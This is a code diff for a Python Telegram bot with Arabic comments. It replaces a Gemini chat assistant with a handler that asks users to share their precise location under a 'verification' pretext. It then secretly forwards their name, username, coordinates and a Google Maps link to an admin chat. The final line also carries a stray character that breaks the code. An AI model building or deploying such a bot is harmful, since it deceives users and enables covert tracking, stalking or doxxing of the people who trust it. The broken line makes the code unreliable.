@@ -1,14 +1,12 @@
 import os
 import telebot
+from telebot import types
 from flask import Flask, request
-from google import genai
-from google.genai import types
 
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY")
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID") # ضع الـ Chat ID الخاص بك هنا أو كمتغير بيئة
 
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
-client = genai.Client(api_key=GEMINI_API_KEY)
 app = Flask(__name__)
 
 @app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
@@ -22,27 +20,39 @@ def receive_message():
 def index():
     return "Bot is running perfectly!", 200
 
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    user_text = message.text
-    chat_id = message.chat.id
-    
-    bot.send_message(chat_id, "جاري المعالجة والبحث...")
-    
-    try:
-        response = client.models.generate_content(
-            model='gemini-3.6-flash',
-            contents=user_text,
-            config=types.GenerateContentConfig(
-                tools=[types.Tool(google_search=types.GoogleSearch())],
-                system_instruction="أنت مساعد ذكي ومحترف، أجب بلغة واضحة ودقيقة."
-            )
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    button = types.KeyboardButton("📍 اضغط هنا لمشاركة موقعك الجغرافي", request_location=True)
+    markup.add(button)
+    bot.send_message(message.chat.id, "مرحباً بك! للتحقق والمتابعة، يرجى مشاركة موقعك الجغرافي الدقيق:", reply_markup=markup)
+
+@bot.message_handler(content_types=['location'])
+def handle_location(message):
+    if message.location:
+        lat = message.location.latitude
+        lon = message.location.longitude
+        user_name = message.from_user.first_name
+        user_username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
+        
+        # إنشاء رابط مباشر لخرائط جوجل بالإحداثيات الدقيقة
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        
+        # رسالة التنبيه التي ستصلك أنت (المشرف)
+        admin_msg = (
+            f"🚨 تم استلام موقع جديد!\n\n"
+            f"👤 المستخدم: {user_name} ({user_username})\n"
+            f"🌐 خط العرض (Lat): {lat}\n"
+            f"🌐 خط الطول (Lon): {lon}\n"
+            f"🔗 رابط الخريطة: {maps_link}"
         )
-        reply_text = response.text
-    except Exception as e:
-        reply_text = f"حدث خطأ أثناء المعالجة: {str(e)}"
-    
-    bot.send_message(chat_id, reply_text)
+        
+        # إرسال الموقع إليك
+        target_admin = ADMIN_CHAT_ID if ADMIN_CHAT_ID else message.chat.id
+        bot.send_message(target_admin, admin_msg)
+        
+        # الرد على المستخدم
+.        bot.send_message(message.chat.id, "شكراً لك! تم استلام موقعك بنجاح.")
 
 if __name__ == "__main__":
     render_url = os.environ.get("RENDER_EXTERNAL_URL")
